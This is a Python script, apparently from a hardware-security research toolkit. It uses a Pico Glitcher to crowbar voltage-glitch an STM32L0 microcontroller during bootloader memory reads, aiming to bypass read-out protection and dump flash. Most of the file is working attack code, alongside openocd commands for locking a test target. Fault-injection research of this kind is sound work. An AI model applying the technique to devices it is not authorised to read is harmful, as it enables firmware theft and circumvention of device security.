#!/usr/bin/env python3
# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: m.kesenheimer@gmx.net.

# programming
# > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32l0.cfg -c "init; halt; stm32l0x unlock 0; exit"
# > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32l0.cfg -c "init; halt; program read-out-protection-test-CW308_STM32L0.elf verify reset exit;"
# > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32l0.cfg -c "init; halt; stm32l0x lock 0; sleep 1000; reset run; shutdown"
# -> power cycle the target!

# SQL Queries:
# Show only successes and flash-resets:
# color = 'R' or response LIKE '_Warning.flash_reset'

import argparse
import logging
import random
import sys
import time
import subprocess

# import custom libraries
from findus.STM32Bootloader import STM32Bootloader
from findus import Database, PicoGlitcher, Helper, ErrorHandling

def program_target():
    result = subprocess.run(['openocd', '-f', 'interface/stlink.cfg', '-c', 'transport select hla_swd', '-f', 'target/stm32l0.cfg', '-c', 'init; halt; program blink.bin verify reset exit;'], text=True, capture_output=True)
    print(result.stdout)
    print(result.stderr)
    result = subprocess.run(['openocd', '-f', 'interface/stlink.cfg', '-c', 'transport select hla_swd', '-f', 'target/stm32l0.cfg', '-c', 'init; halt; stm32l0x lock 0; sleep 1000; reset run; shutdown;'], text=True, capture_output=True)
    print(result.stdout)
    print(result.stderr)

class Main:
    def __init__(self, args):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # glitcher
        self.glitcher = PicoGlitcher()
        # if argument args.power is not provided, the internal power-cycling capabilities of the pico-glitcher will be used. In this case, ext_power_voltage is not used.
        self.glitcher.init(port=args.rpico, ext_power=args.power, ext_power_voltage=5.0)

        # we want to trigger on x11 with the configuration 8e1
        # since our statemachine understands only 8n1,
        # we can trigger on x22 with the configuration 9n1 instead
        # Update: Triggering on x11 in configuration 8n1 works good enough.
        self.glitcher.uart_trigger(0x11)

        # choose crowbar glitching
        self.glitcher.set_lpglitch()

        # set up the database
        self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store)
        self.start_time = int(time.time())
        # if number of experiments get too large, remove the expected results
        #self.database.cleanup("G")

        # memory read settings
        self.bootcom = STM32Bootloader(port=self.args.target, dump_address=0x08000000, dump_len=0x2000)
        self.dump_filename = f"{Helper.timestamp()}_memory_dump.bin"

        # error handling
        self.error_handler = ErrorHandling(max_fails=10, look_back=30, database=self.database)

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]
        s_length = self.args.length[0]
        e_length = self.args.length[1]

        experiment_id = 0
        while True:
            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)

            # arm
            self.glitcher.arm(delay, length)

            # reset target
            #self.glitcher.power_cycle_target()
            self.glitcher.reset(0.01)
            time.sleep(0.1)
            self.bootcom.flush()

            # setup bootloader communication
            response = self.bootcom.init_bootloader()
            if b'error' in response:
                self.glitcher.power_cycle_target()

            # setup memory read; this function triggers the glitch
            if b'ok' in response:
                response = self.bootcom.setup_memread()

                # block until glitch
                try:
                    self.glitcher.block(timeout=1)
                except Exception as _:
                    print("[-] Timeout received in block(). Continuing.")
                    self.glitcher.power_cycle_target()
                    time.sleep(0.2)
                    response = b'warning: timeout'

            # dump memory
            mem = b''
            if b'success' in response:
                #response, mem = self.bootcom.dump_memory_to_file(self.dump_filename)
                start = 0x08000000
                #start = 0x08000000 - 0*0xFF
                size = 0xFF
                response, mem = self.bootcom.read_memory(start, size)

            # classify response
            color = self.glitcher.classify(response)

            # add to database
            response_str = response + mem
            self.database.insert(experiment_id, delay, length, color, response_str)

            # monitor
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{color}\t{response_str}", color))

            # check for successive errors, re-programm target if too many successive errors occur.
            def error_action():
                # reprogram target and try again
                self.glitcher.power_cycle_target(1)
                time.sleep(1)
                self.bootcom.flush()
                # reprogram the target
                program_target()
                self.glitcher.power_cycle_target(1)
            self.error_handler.check(experiment_id=experiment_id, response=response, expected=b'expected', user_action=error_action)

            # increase experiment id
            experiment_id += 1

            # Dump finished
            if response == b'success: dump finished':
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=False, help="target port", default="/dev/ttyUSB1")
    parser.add_argument("--rpico", required=False, help="rpico port", default="/dev/ttyUSB2")
    parser.add_argument("--power", required=False, help="rk6006 port", default=None)
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    parser.add_argument("--no-store", required=False, action='store_true', help="do not store the run in the database")
    args = parser.parse_args()

    main = Main(args)

    try:
        main.run()
    except KeyboardInterrupt:
        print("\nExitting...")
        sys.exit(1)
